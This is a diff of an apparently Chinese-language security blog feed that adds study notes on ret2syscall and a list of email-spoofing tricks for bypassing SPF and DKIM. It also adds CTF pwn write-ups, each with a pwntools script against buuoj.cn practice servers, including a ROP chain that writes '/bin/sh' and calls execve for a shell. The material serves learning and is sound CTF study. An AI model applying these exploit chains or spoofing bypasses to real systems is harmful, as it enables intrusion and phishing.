@@ -3148,7 +3148,51 @@
 
 <h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>最基本的ROP，溢出返回地址之后跳到text节，这种情况一般只有在NX没有开启时才可能</p>
 <h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>在栈不可执行被开启后，如果程序中存在关键的系统调用，如<code>system</code>、<code>execve</code>等，就可以返回到这里；</p>
-<p>覆盖了返回地址之后填成相应的函数，调用<code>system</code>等等</p>
+<p>系统调用的话一般是使用<code>int 80</code>这样的gadget进行调用；</p>
+<p>在调用起来系统调用之前，需要有设置寄存器的过程，一般是使用<code>pop eax</code>这样的gadget来设置</p>
+<p>系统调用的相关知识可以看<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">wiki</a></p>
+<p>在调用之前设置<code>eax</code>为系统调用号，剩余参数依次放在<code>ebx</code>、<code>ecx</code>、<code>edx</code></p>
+<p>各个系统调用的系统调用号可以看<a href="https://blog.csdn.net/qq_29343201/article/details/52209588">这里</a></p>
+<p>一般常用到的32位系统调用有</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>系统调用号</th>
+<th>原型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>read</code></td>
+<td>3</td>
+<td><code>read(fd,buf,size)</code></td>
+</tr>
+<tr>
+<td><code>write</code></td>
+<td>4</td>
+<td><code>write(fd,buf,size)</code></td>
+</tr>
+<tr>
+<td><code>open</code></td>
+<td>5</td>
+<td><code>open(path,flags)</code></td>
+</tr>
+<tr>
+<td><code>close</code></td>
+<td>6</td>
+<td><code>close(fd)</code></td>
+</tr>
+<tr>
+<td><code>execve</code></td>
+<td>11</td>
+<td><code>execve(command,NULL,NULL)</code></td>
+</tr>
+<tr>
+<td><code>chmod</code></td>
+<td>15</td>
+<td><code>chmod(path,mode)</code></td>
+</tr>
+</tbody></table>
 <h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>有时候可能可以在内存中写入可控的shellcode，但是在开启了NX后栈是不可执行的；</p>
 <p>因此shellcode就需要写如到如bss段这样的区域，并且可能还需要通过mprotect修改bss段的写权限和执行权限</p>
 <h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>在程序本身没有引入我们需要的函数，如<code>system</code>、<code>execve</code>等时，我们可以采用这样的方法。</p>
@@ -6530,6 +6574,22 @@
 <li>Direct MTA attack</li>
 <li>Forward MTA attack</li>
 </ol>
+<ol>
+<li>Auth username和Mail From不同</li>
+<li>Mail From 和 From不同</li>
+<li>Mail From为空</li>
+<li>存在多个From字段</li>
+<li>存在多个邮件地址</li>
+<li>解析上的问题，如多个<code>@</code></li>
+<li>编码上的问题</li>
+<li>子域名攻击，这样使得SPF得到不存在的结果，绕过SPF</li>
+<li>未授权的Forward绕过</li>
+<li>DKIM签名欺骗</li>
+<li>ARC问题</li>
+<li>IDN域名</li>
+<li>UI渲染缺失</li>
+<li>从右到左读绕过</li>
+</ol>
 <p>receiving verification</p>
 <p>退信时会发一个mail from为空的邮件</p>
 <p>通过这个机制，将mail from置为空可以绕过</p>
@@ -7367,6 +7427,38 @@
 <p>整体很基础，就是最简单的构造ROP链</p>
 <p>记得把调用win2的参数pop出来就可以</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28619</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./PicoCTF_2018_rop_chain&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./PicoCTF_2018_rop_chain&#x27;</span>)</span><br><span class="line"></span><br><span class="line">popebx_ret = <span class="number">0x804840d</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;input&gt;&#x27;</span>)</span><br><span class="line">payload = bytes(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span>,<span class="string">&#x27;ascii&#x27;</span>) + p32(elf.sym[<span class="string">&#x27;win_function1&#x27;</span>]) + p32(elf.sym[<span class="string">&#x27;win_function2&#x27;</span>]) + p32(popebx_ret) + p32(<span class="number">0xBAAAAAAD</span>) + p32(elf.sym[<span class="string">&#x27;flag&#x27;</span>]) + p32(popebx_ret) + p32(<span class="number">0x0deadbaad</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="picoctf-2018-bufferoverflow1"><a href="#picoctf-2018-bufferoverflow1" class="headerlink" title="picoctf_2018_bufferoverflow1"></a>picoctf_2018_bufferoverflow1</h2><p>程序本身是完全不开安全机制的</p>
+<p><img src="image-20201203101253157.png" alt="image-20201203101253157"></p>
+<p>出现问题的函数</p>
+<p><img src="image-20201203101343293.png" alt="image-20201203101343293"></p>
+<p>这个gets直接导致溢出</p>
+<p>返回地址是用这个<code>get_return_address</code>获取的</p>
+<p>在程序中还有一个后门函数</p>
+<p><img src="image-20201203101657362.png" alt="image-20201203101657362"></p>
+<p>溢出gets之后控制返回地址到这个win就可以了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27887</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./PicoCTF_2018_buffer_overflow_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./PicoCTF_2018_buffer_overflow_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload  = bytes(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span>,<span class="string">&#x27;ascii&#x27;</span>) + p32(elf.sym[<span class="string">&#x27;win&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><p>这道题安全机制全开，64位程序</p>
+<p><img src="buuctf-pwn1/image-20201203102518274.png" alt="image-20201203102518274"></p>
+<p>堆题，放一放</p>
+<h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p><img src="image-20201203104555695.png" alt="image-20201203104555695"></p>
+<p>32位rop</p>
+<p><img src="image-20201203104848077.png" alt="image-20201203104848077"></p>
+<p>main函数中出现溢出的地方在这个read</p>
+<p>比较奇怪的是，这里实际上在执行时v4这个缓冲区和ebp的距离并不是14h</p>
+<p>可能是因为这个程序是静态链接的，也可能是因为要返回的是main函数</p>
+<p>在gdb里面调试，执行到read的时候停下来</p>
+<p><img src="image-20201208105650091.png" alt="image-20201208105650091"></p>
+<p>计算这时ebp和eax之间相差28；</p>
+<p>那么实际上我们需要填充28+4字节的ebp，之后才是返回地址</p>
+<p>利用的脚本倒是不难，是一个ret2syscall，返回到execve系统调用就可以</p>
+<p>不过需要首先将<code>/bin/sh</code>这个字符串写在bss段，由于read直接在符号表中可以找到，可以直接调用</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28409</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./simplerop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./simplerop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x80bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x806e850</span></span><br><span class="line">int_80 = <span class="number">0x80493e1</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">&#x27;b&#x27;</span>*<span class="number">32</span>,<span class="string">&#x27;ascii&#x27;</span>) + p32(read_plt) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">1</span>) + p32(elf.bss())+ p32(<span class="number">0x8</span>) + p32(pop_eax_ret) + p32(<span class="number">11</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(elf.bss()) + p32(int_80)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
